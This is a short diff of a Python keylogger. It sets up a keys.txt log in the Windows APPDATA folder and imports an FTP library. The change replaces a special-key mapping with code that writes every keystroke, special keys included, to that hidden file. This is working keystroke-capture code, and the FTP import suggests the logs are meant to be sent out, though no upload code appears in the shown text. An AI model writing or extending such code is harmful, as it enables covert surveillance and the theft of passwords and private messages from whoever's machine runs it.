@@ -5,14 +5,6 @@ from ftplib import FTP
 appdata = os.getenv('APPDATA')
 keylogs = appdata+'/keys.txt'
 
-spec_chars = {
-    keyboard.Key.alt: " <ALT> ",
-    keyboard.Key.alt_l: " <LEFT ALT> ",
-    keyboard.Key.backspace: " <BACKSPACE> ",
-    keyboard.Key.caps_lock: " <CAPSLOCK> ",
-    keyboard.Key.space: " <SPACE> ",
-}
-
 if os.path.exists(keylogs):
     f = open(keylogs, 'r')
     f.close()
@@ -22,12 +14,10 @@ else:
 
 def on_press(key):
     f = open(keylogs, 'a')
-    #print(key)
-    # for specchar in spec_chars:
-    #     if key == specchar:
-    #         f.write(spec_chars[key])
-    #     else:
-    #         f.write(key.char)
+    if type(key) == keyboard.Key:
+        f.write(" <" + str(key) + "> ")
+    else:
+        f.write(key.char)
 
     f.close()
 
